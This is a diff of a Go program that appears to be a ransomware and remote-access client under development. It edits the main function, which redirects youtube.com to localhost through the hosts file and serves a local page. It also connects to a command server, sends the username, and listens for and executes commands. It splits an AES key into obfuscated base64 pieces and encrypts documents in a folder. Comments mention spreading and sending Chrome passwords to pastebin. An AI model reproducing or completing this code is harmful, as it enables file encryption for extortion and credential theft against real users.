@@ -6,16 +6,11 @@
 package main
 
 import (
-	"crypto/rand"
-	"fmt"
 	"strings"
 
 	"./aes"
 	"./base64"
-	"./install"
-	"./instances"
 	"./network"
-	"./utils"
 )
 
 // TargetFileName is the name taken by the Program
@@ -23,21 +18,15 @@ import (
 var key_text []byte
 
 func main() {
-	network.AddHost("127.0.0.1", "www.youtube.com")
-	network.ServePage("ok4", 80)
-	fmt.Println("here")
-}
-
-func main_testing() {
 	//Check if already running
-	instances.CheckMultiInstances()
+	/*instances.CheckMultiInstances()
 	install.Install()
 
 	//go Spread()
-	network.Connect()
-	network.Send("user", utils.GetUsername())
+	go network.Connect()
+	go network.Send("user", utils.GetUsername())
 	go ListenAndExecute()
-	go network.Reconnect()
+	go network.Reconnect()*/
 
 	//SendData("Ok from client using cap'p")
 
@@ -52,15 +41,6 @@ func main_testing() {
 
 	//Send chrome pass to pastebin
 
-	//Gen aes key
-	b := make([]byte, 36)
-	_, err := rand.Read(b)
-	if err != nil {
-		fmt.Println("error:", err)
-		return
-	}
-	fmt.Println(b)
-
 	//Gen
 	//Deofuscate key
 	b64_1 := "fSss" + "L1IkKy"
@@ -70,7 +50,8 @@ func main_testing() {
 	final := b64_1 + b64_2 + b64_3 + b64_4
 	key_text = []byte(base64.Decode(final))
 	//When key decoded
-	aes.InitializeBlock(key_text, utils.TARGET_FILE_NAME)
+	aes.InitializeBlock(key_text)
+	aes.EncryptDocumets("/Users/mac/Tiked/Client/test", true)
 	for {
 	}
 }
